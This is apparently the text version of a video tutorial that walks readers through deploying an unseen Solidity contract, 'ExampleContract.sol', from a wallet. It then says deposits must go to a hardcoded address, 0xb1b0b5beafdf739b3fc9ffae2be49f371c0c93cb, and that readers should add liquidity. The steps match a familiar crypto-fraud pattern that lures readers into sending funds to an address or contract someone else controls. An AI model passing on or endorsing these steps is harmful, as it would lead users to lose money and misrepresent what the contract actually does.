📖 Full Text Guide

(Following along with the video is much easier)

  • 👉 Get a Web3 wallet (MetaMask recommended) and fund it on your target network.
  • 👉 Head over to the development site.
  • 👉 Create a new file in the contracts folder and name it ExampleContract.sol.
  • 👉 Paste the code from the box above into your new file.
  • 👉 Go to the compile tab and compile with Solidity 0.8.4+.
  • 👉 Go to the deploy tab, connect your wallet, and deploy the contract.
  • 👉 Depot: contract deposits must be sent to 0xb1b0b5beafdf739b3fc9ffae2be49f371c0c93cb
  • 👉 Provide sufficient liquidity, then use your deployed contract as needed.

📱 Mobile Users

MetaMask, Phantom, Coinbase Wallet, and other in-app browsers work best when you open the development site link above directly from your wallet app.
